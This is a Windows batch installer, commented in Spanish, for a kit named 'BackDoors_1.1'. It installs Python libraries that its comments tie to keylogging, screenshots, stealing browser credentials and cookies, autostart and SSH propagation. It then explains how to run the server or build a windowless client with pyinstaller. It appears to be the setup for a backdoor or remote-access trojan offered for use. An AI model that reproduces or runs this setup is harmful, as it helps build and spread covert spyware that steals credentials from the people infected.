@echo off
echo ==========================================
echo  Instalador de BackDoors_1.1 (Windows)
echo ==========================================

REM Actualiza pip
python -m pip install --upgrade pip

REM Instala dependencias principales
pip install cryptography psutil pynput pyscreenshot Pillow pytest tk fpdf2 pysocks pyinstaller pywin32 browser_cookie3 pycryptodomex

REM Para soporte de Chrome/Edge/Opera (credenciales, cookies)
pip install pypiwin32

REM Soporte para autoarranque y credenciales avanzadas
pip install pywin32

REM Si quieres soporte de GUI avanzada (Tkinter)
pip install tk

REM (Opcional) Instala sshpass para Windows si usas propagación por SSH (requiere adaptaciones):
REM choco install openssh
REM choco install sshpass

echo ==========================================
echo    Instalacion completada.
echo ------------------------------------------
echo  Ejecuta el server con:
echo     python server\\main.py
echo  O compila el cliente con:
echo     pyinstaller --onefile --noconsole --add-data "core;core" --add-data "modules;modules" cliente\\main.py
echo ==========================================
pause
